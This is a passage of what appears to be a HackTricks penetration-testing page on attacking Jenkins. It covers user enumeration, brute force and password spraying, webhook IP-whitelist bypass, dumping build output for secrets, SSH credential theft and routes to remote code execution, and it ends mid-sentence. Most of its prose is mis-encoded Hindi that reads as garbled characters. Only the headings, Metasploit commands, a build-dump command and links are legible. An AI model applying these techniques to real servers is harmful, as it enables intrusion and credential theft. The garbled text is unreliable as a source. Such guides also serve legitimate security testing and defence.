# Jenkins Security

{% hint style="success" %}
AWS Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХреЛ рд╕рдорд░реНрдерди рджреЗрдВ</summary>

* [**subscription plans**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **рд╣рдореЗрдВ рдлреЙрд▓реЛ рдХрд░реЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
{% endhint %}

## Basic Information

Jenkins рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓рдЧрднрдЧ **рдХрд┐рд╕реА рднреА** **рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛рдУрдВ** рдФрд░ рд╕реНрд░реЛрдд рдХреЛрдб рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЗ рд╕рдВрдпреЛрдЬрди рдХреЗ рд▓рд┐рдП рдПрдХ **рдирд┐рд░рдВрддрд░ рдПрдХреАрдХрд░рдг** рдпрд╛ **рдирд┐рд░рдВрддрд░ рд╡рд┐рддрд░рдг** (CI/CD) рд╡рд╛рддрд╛рд╡рд░рдг рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╕рд░рд▓ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рд╡рд┐рднрд┐рдиреНрди рдирд┐рдпрдорд┐рдд рд╡рд┐рдХрд╛рд╕ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЬрдмрдХрд┐ Jenkins **рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЪрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рдХрд░рддрд╛**, рдпрд╣ рдирд┐рд░реНрдорд╛рдг, рдкрд░реАрдХреНрд╖рдг, рдФрд░ рдкрд░рд┐рдирд┐рдпреЛрдЬрди рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдкреВрд░реЗ рдЕрдиреБрдХреНрд░рдо рдХреЛ рдПрдХреАрдХреГрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддреЗрдЬрд╝ рдФрд░ рдЕрдзрд┐рдХ рдордЬрдмреВрдд рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рддрдирд╛ рдХрд┐ рдХреЛрдИ рдЖрд╕рд╛рдиреА рд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Unauthenticated Enumeration

рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рджрд┐рд▓рдЪрд╕реНрдк Jenkins рдкреГрд╖реНрдареЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреИрд╕реЗ (_/people_ рдпрд╛ _/asynchPeople_, рдпрд╣ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рддрд╛ рд╣реИ) рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
рдЬрд╛рдБрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдмрд┐рдирд╛ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
msf> use auxiliary/scanner/http/jenkins_command
```
рдмрд┐рдирд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рдЖрдк _**/asynchPeople/**_ рдкрде рдпрд╛ _**/securityRealm/user/admin/search/index?q=**_ рдореЗрдВ **usernames** рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк _**/oops**_ рдпрд╛ _**/error**_ рдкрде рд╕реЗ Jenkins рд╕рдВрд╕реНрдХрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

![](<../../.gitbook/assets/image (146).png>)

### рдЬреНрдЮрд╛рдд рдХрдордЬреЛрд░рд┐рдпрд╛рдБ

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## рд▓реЙрдЧрд┐рди

рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рдЖрдк **Jenkins рдХреЗ рдЕрдВрджрд░ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд╕рднреА рддрд░реАрдХреЗ** рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### рдкрдВрдЬреАрдХрд░рдг

рдЖрдк рдРрд╕реА Jenkins рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдЖрдкрдХреЛ рдПрдХ рдЦрд╛рддрд╛ рдмрдирд╛рдиреЗ рдФрд░ рдЙрд╕рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВред рдмрд╕ рдЗрддрдирд╛ рд╣реА рд╕рд░рд▓ред**

### **SSO рд▓реЙрдЧрд┐рди**

рдпрджрд┐ **SSO** **рдлрдВрдХреНрд╢рдирд▓рд┐рдЯреА**/**рдкреНрд▓рдЧрдЗрдиреНрд╕** рдореМрдЬреВрдж рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ **рд▓реЙрдЧ-рдЗрди** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдПрдХ рдЯреЗрд╕реНрдЯ рдЕрдХрд╛рдЙрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ (рдЬреИрд╕реЗ, рдПрдХ рдЯреЗрд╕реНрдЯ **Github/Bitbucket рдЕрдХрд╛рдЙрдВрдЯ**)ред [**рдпрд╣рд╛рдБ**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/) рд╕реЗ рдЯреНрд░рд┐рдХред

### рдмреНрд░реВрдЯрдлреЛрд░реНрд╕

**Jenkins** рдореЗрдВ **рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐** рдФрд░ **рдпреВрдЬрд░рдиреЗрдо рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рд╢рдорди** рдХреА рдХрдореА рд╣реИред **рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕** рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдХрдордЬреЛрд░ рдкрд╛рд╕рд╡рд░реНрдб** рдпрд╛ **рдпреВрдЬрд░рдиреЗрдореНрд╕ рдХреЛ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд░реВрдк рдореЗрдВ** рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рдЙрд▓реНрдЯреЗ рдпреВрдЬрд░рдиреЗрдореНрд╕ рдХреЛ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд░реВрдк рдореЗрдВ**ред
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

[рдЗрд╕ python script](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) рдпрд╛ [рдЗрд╕ powershell script](https://github.com/chryzsh/JenkinsPasswordSpray) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

### IP Whitelisting Bypass

рдХрдИ рд╕рдВрдЧрдарди **SaaS-рдЖрдзрд╛рд░рд┐рдд source control management (SCM) systems** рдЬреИрд╕реЗ GitHub рдпрд╛ GitLab рдХреЛ **рдЖрдВрддрд░рд┐рдХ, self-hosted CI** рд╕рдорд╛рдзрд╛рди рдЬреИрд╕реЗ Jenkins рдпрд╛ TeamCity рдХреЗ рд╕рд╛рде рд╕рдВрдпреЛрдЬрд┐рдд рдХрд░рддреЗ рд╣реИрдВред рдпрд╣ рд╕реЗрдЯрдЕрдк CI systems рдХреЛ **SaaS source control vendors рд╕реЗ webhook events рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ pipeline jobs рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╕рдВрдЧрдарди **SCM platforms рдХреЗ IP ranges** рдХреЛ **whitelist** рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ **webhooks** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдЖрдВрддрд░рд┐рдХ CI system** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ **рдХреЛрдИ рднреА** GitHub рдпрд╛ GitLab рдкрд░ рдПрдХ **account** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **webhook рдЯреНрд░рд┐рдЧрд░** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **рдЖрдВрддрд░рд┐рдХ CI system** рдХреЛ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЬрд╛рдВрдЪреЗрдВ: [https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Internal Jenkins Abuses

рдЗрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рд╣рдо рдорд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ Jenkins рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реИрдз рдЦрд╛рддрд╛ рд╣реИред

{% hint style="warning" %}
Jenkins рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП **Authorization** рддрдВрддреНрд░ рдФрд░ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЕрдиреБрдорддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЖрдк **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣рдорд▓реЛрдВ рдХреЛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВред**
{% endhint %}

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦреЗрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listing users

рдпрджрд┐ рдЖрдкрдиреЗ Jenkins рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реА рд╣реИ рддреЛ рдЖрдк [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) рдкрд░ рдЕрдиреНрдп рдкрдВрдЬреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### Dumping builds to find cleartext secrets

рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП build console outputs рдФрд░ build environment variables рдХреЛ dump рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [рдЗрд╕ script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЪреБрд░рд╛рдирд╛**

рдпрджрд┐ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдирдпрд╛ Jenkins рдиреЛрдб рдмрдирд╛рдиреЗ/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд░рдЦрддрд╛ рд╣реИ** рдФрд░ SSH рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЕрдиреНрдп рдиреЛрдбреНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИрдВ, рддреЛ рд╡рд╣ **рдЙрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ** рдПрдХ рдиреЛрдб рдмрдирд╛рдХрд░/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдФрд░ **рдПрдХ рд╣реЛрд╕реНрдЯ рд╕реЗрдЯ рдХрд░рдХреЗ рдЬреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рд░рд┐рдХреЙрд░реНрдб рдХрд░реЗрдЧрд╛** рдмрд┐рдирд╛ рд╣реЛрд╕реНрдЯ рдХреБрдВрдЬреА рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдП:

![](<../../.gitbook/assets/image (218).png>)

рдЖрдк рдЖрдорддреМрд░ рдкрд░ Jenkins ssh рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдПрдХ **рдЧреНрд▓реЛрдмрд▓ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░** (`/credentials/`) рдореЗрдВ рдкрд╛рдПрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЙрдиреНрд╣реЗрдВ рд╡реИрд╕реЗ рд╣реА рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдЖрдк рдХрд┐рд╕реА рдЕрдиреНрдп рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдбрдВрдк рдХрд░реЗрдВрдЧреЗред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**Dumping secrets section**](./#dumping-secrets) рджреЗрдЦреЗрдВред

### **Jenkins рдореЗрдВ RCE**

Jenkins рд╕рд░реНрд╡рд░ рдореЗрдВ **рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛** рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕рднреА **рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА** рдФрд░ **env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕** рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдФрд░ рдЙрд╕реА рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕реНрдерд┐рдд рдЕрдиреНрдп рдорд╢реАрдиреЛрдВ рдХрд╛ **рд╢реЛрд╖рдг рдХрд░рдиреЗ** рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рдХреНрд▓рд╛рдЙрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдПрдХрддреНрд░ рдХрд░рдиреЗ** рдХрд╛ рдЕрд╡рд╕рд░ рджреЗрддрд╛ рд╣реИред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Jenkins **SYSTEM рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓реЗрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, рдЗрд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **SYSTEM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рдорд┐рд▓реЗрдВрдЧреЗред

### **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдирд╛/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдореЗрдВ RCE**

Jenkins рд╕рд░реНрд╡рд░ рдкрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдирд╛/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рд╣реИ:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovy рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдореЗрдВ RCE**

рдЖрдк Groovy рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рднреА RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдирдпрд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдиреЗ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдЕрдзрд┐рдХ рдЧреБрдкреНрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдмрдирд╛рдирд╛/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдореЗрдВ RCE

рдЖрдк **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдмрдирд╛рдХрд░/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рднреА RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## рдкрд╛рдЗрдкрд▓рд╛рдЗрди рд╢реЛрд╖рдг

рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЕрднреА рднреА Jenkins рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

### рдмрд┐рд▓реНрдб рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕

**рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕** рдХреЛ **рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рдореЗрдВ рдмрд┐рд▓реНрдб рддрдВрддреНрд░** рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЗрд╕реЗ **рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЗ рдЕрдВрджрд░ рдПрдХ рдлрд╝рд╛рдЗрд▓** рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рд╕рд┐рдВрдЯреИрдХреНрд╕ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдЧрд╛ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `/Jenkinsfile` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (127).png>)

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрдиреНрдп рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рдП** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ) **рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдПрдХреНрд╕реЗрд╕** рдФрд░ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдПрдХреНрд╕реЗрд╕ рдХреЛ **рдЕрд▓рдЧ рдХрд░рдиреЗ** рдХреЗ рдЙрджреНрджреЗрд╢реНрдп рд╕реЗред

рдпрджрд┐ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ **рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдкрд╣реБрдВрдЪ рд╣реИ** рддреЛ рд╡рд╣ рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдмрд┐рдирд╛ Jenkins рддрдХ рдкрд╣реБрдВрдЪ рдХреЗред\
рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдХреБрдЫ рдмреНрд░рд╛рдВрдЪ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ** (рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЙрдиреНрд╣реЗрдВ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ)ред

рдХрд╕реНрдЯрдо рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдЯреНрд░рд┐рдЧрд░реНрд╕ рд╣реИрдВ:

* **рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ рдкрд░ рдкреБрд▓ рдЕрдиреБрд░реЛрдз** (рдпрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдиреНрдп рд╢рд╛рдЦрд╛рдУрдВ рдкрд░)
* **рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ рдкрд░ рдкреБрд╢** (рдпрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдиреНрдп рд╢рд╛рдЦрд╛рдУрдВ рдкрд░)
* **рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ** рдФрд░ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдЗрд╕рдХреЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ

{% hint style="info" %}
рдпрджрд┐ рдЖрдк рдПрдХ **рдмрд╛рд╣рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ **рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рд╕рдВрдЧрдарди рдХреЗ рд░рд┐рдкреЛ рдХреА рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ рдкрд░ PR рдмрдирд╛рдиреЗ** рдФрд░ **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ** рдХреА рдЙрдореНрдореАрдж рдирд╣реАрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП... рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдпрд╣ **рдЦрд░рд╛рдм рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рддреЛ рдЖрдк рдХреЗрд╡рд▓ рдЗрд╕реЗ **рд╢реЛрд╖рдг рдХрд░рдХреЗ 